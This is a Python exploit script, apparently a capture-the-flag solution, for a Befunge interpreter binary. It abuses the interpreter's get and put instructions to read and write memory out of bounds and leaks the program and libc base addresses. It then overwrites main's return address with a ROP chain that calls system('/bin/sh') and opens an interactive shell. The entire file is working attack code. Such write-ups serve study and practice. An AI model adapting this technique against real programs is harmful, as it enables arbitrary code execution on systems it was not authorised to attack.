#/usr/bin/env python
# coding:utf-8

from ctf import *


binary = './befunge'
mode = args['MODE'].lower()
if mode == 'debug':
    io = debug(binary)
    io.b([])
    io.r()
else:
    io = process(binary)

elf = ELF(binary)
libc = ELF(filter(lambda x: 'libc.so' in x, elf.libs.keys())[0])

INPUT_PROGRAM_PTR = 0x201fe0
ENVIRON_TO_MAIN_RET = 240
POP_RDI_TO_PROGRAM = 0x000000000000120c


def init():
    program = '''
>~11v
^ p <
    '''
    program = program.strip().split('\n')
    program += [''] * (25 - len(program))
    io.sendlines(program)
    io.clean(1)


def recv_chars(length):
    return ''.join(unordlist(map(lambda x: int(io.recvregex('^[^0-9-]*(-?\d+)\D', group=1)) & 0xff, xrange(8))))


def push_number(x):
    if x < 0:
        io.send(0)
        push_number(-x)
        io.send('-')
        return
    io.send(oct(x)[0])
    for i in oct(x)[1:]:
        io.send(8)
        io.send('*')
        io.send(i)
        io.send('+')


def read_relative(offset, length=8):
    push_number(offset)
    io.send('1+'.join([':0g.'] * length))
    io.send('$')
    return recv_chars(length)


def read(addr, length=8):
    global input_program_addr
    return read_relative(addr - input_program_addr)


def write_relative(offset, s):
    push_number(offset)
    s = [':~' + c + r'\0p' for c in s]
    io.send('1+'.join(s))
    io.send('$')


def write(addr, s):
    global input_program_addr
    return write_relative(addr - input_program_addr, s)


init()
input_program_addr = u64(read_relative(INPUT_PROGRAM_PTR - elf.symbols['program']))
log.info('input program address: %#x', input_program_addr)
program_base_addr = input_program_addr - elf.symbols['program']
log.info('program base address: %#x', program_base_addr)

puts_addr = u64(read_relative(elf.got['puts'] - elf.symbols['program']))
log.info('puts address: %#x', puts_addr)
libc_addr = puts_addr - libc.symbols['puts']
log.info('libc address: %#x', libc_addr)
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + libc.search('/bin/sh').next()
environ_addr = libc_addr + libc.symbols['environ']

environ = u64(read(environ_addr))
log.info('environ: %#x', environ)
main_ret_addr = environ - ENVIRON_TO_MAIN_RET

payload = p64(program_base_addr + POP_RDI_TO_PROGRAM)
payload += p64(binsh_addr)
payload += p64(system_addr)
write(main_ret_addr, payload)

io.send(' ' * 10000)
io.clean()

io.interactive()
